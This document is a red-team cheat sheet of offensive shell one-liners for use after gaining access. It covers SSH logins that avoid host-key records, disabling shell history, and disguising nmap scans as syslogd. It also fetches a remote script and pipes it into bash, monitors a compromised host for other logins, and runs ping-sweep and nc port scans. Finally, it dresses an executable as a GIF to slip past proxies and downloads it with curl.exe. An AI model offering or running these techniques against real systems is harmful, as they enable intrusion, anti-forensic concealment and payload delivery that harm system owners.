---
title: Red Team Tips
date: 2099-11-24 15:17:17
icon: icon-hackaday
background: bg-[#d33731]
tags:
    - red team
    - attack
categories:
    - Initial Access
intro: |
    Red Team Offensive Tips.
---

## hide your purpose

### ssh connection not logged {.row-span-2}

#### ssh.sh Source Code

```shell script{.wrap}
#!/bin/sh
sshpass -p $3 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null $2@$1
```

#### ↓ Examples

```bash
$ ./ssh.sh 10.10.10.10 root password
```

### Execute after login

```bash
$ export HISTFILE=/dev/null
```
Disable history


### hide

```bash{.wrap}
$ (exec -a syslogd nmap -T0 10.0.2.1/24)
```

Hide commands by masking them to syslogd

### hide

```bash{.wrap}
$ exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &
```

Start a background hidden process as syslogd

### hide

```bash{.wrap}
$ curl -fsS https://<localhost>/script.sh | bash
```

The script file does not land

------------

## Online notification  {.cols-1}

### tcpdump

Sometimes you own a machine, but you need to know if there are other login operations. Here's one way to do it with tcpdump on the target Linux system:

```bash {.wrap}
$ tcpdump -i <ens0> -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -e '\a'; done 
```

-------------

## Host scans in specific scenarios {.cols-2}

### ping

```bash {.wrap}
$ for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

### nc

```bash {.wrap}
$ nc -zv 192.168.0.1 1-65535 &> results && cat results | grep succeeded
```

## Get server IP address and port {.cols-2}

### ip

* When there is no `arp` command, you can use `ip neigh`
{.marker-round}

### port

* When there are no `ip`, `ifconfig` and other commands (such as in the container), you can use cat `/proc/net/fib_trie` to view the local IP and you will see the IPv4 address. Or `/proc/net/tcp`, to view the hexadecimal port converted data.
  {.marker-round}

-------------

## file transfer {.cols-1}

### bypass transfer

When a proxy blocks your file downloads:

```bash {.wrap}
$ sed '1s/^/GIF87a/' calc.exe > calc.gif
```

#### Windows Run

```powershell {.wrap}
cmd> curl.exe -qk -X GET -C 6 https://example.com/calc.gif > calc.exe
```

